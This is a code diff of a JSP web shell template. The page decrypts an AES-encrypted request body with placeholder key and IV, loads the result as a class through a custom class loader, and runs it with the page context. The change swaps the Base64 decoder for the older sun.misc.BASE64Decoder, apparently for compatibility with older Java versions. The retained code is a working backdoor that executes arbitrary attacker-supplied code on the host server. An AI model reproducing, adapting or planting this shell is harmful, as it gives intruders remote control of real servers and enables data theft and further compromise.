@@ -1,5 +1,4 @@
 <%@ page import="java.io.BufferedReader" %>
-<%@ page import="java.util.Base64" %>
 <%@ page import="javax.crypto.SecretKey" %>
 <%@ page import="javax.crypto.spec.SecretKeySpec" %>
 <%@ page import="javax.crypto.spec.IvParameterSpec" %>
@@ -21,7 +20,7 @@
         try {
             SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
             AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
-            byte[] decodeBase64 = Base64.getDecoder().decode(encrypted);
+            byte[] decodeBase64 = new sun.misc.BASE64Decoder().decodeBuffer(encrypted);
             // 指定加密的算法、工作模式和填充方式
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipher.init(Cipher.DECRYPT_MODE, key, iv);
@@ -36,6 +35,6 @@
     String wholeStr = request.getReader().readLine();
     if(wholeStr != null && !wholeStr.trim().equals("")) {
         wholeStr = decrypt(wholeStr);
-        new U(this.getClass().getClassLoader()).g(Base64.getDecoder().decode(wholeStr)).newInstance().equals(pageContext);
+        new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(wholeStr)).newInstance().equals(pageContext);
     }
 %>
